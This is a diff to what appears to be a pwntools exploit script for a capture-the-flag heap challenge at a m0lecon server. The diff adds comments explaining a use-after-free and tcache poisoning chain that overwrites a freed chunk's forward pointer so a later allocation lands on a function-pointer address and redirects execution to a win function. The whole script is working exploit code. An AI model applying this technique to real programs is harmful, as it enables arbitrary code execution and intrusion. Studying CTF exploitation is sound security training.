@@ -11,6 +11,7 @@ def conn():
 
 p = remote("offsec.m0lecon.it", 13543)
 
+#Menu option 5 executes whatever function is stored in ghand_addr
 ghand_addr = 0x4040c0
 win_addr = 0x401306
 
@@ -24,6 +25,8 @@ p.sendlineafter(b'> ', b'1') # create
 p.sendlineafter(b'index: ', b'2') # index
 p.sendlineafter(b'data: ', b'hello2') #  Data
 
+
+#free tehm so that they go in tcache
 #free slot A
 p.sendlineafter(b'> ', b'2') # create
 p.sendlineafter(b'index: ', b'1') # index
@@ -38,7 +41,7 @@ payload1 = flat(
     p64(ghand_addr)
         )
 
-#edit slot B
+#edit slot B - UAF and allows to overwrite fd with ghand_addr
 p.sendlineafter(b'> ', b'3') # create
 p.sendlineafter(b'index: ', b'2') # index
 p.sendlineafter(b'data: ', payload1) #  Data
@@ -52,7 +55,7 @@ p.sendlineafter(b'> ', b'1') # create
 p.sendlineafter(b'index: ', b'3') # index
 p.sendlineafter(b'data: ', payload2) #  Data
 
-#create slot D 
+#create slot D - this one in allocated at ghand_addr
 p.sendlineafter(b'> ', b'1') # create
 p.sendlineafter(b'index: ', b'4') # index
 p.sendlineafter(b'data: ', payload2)
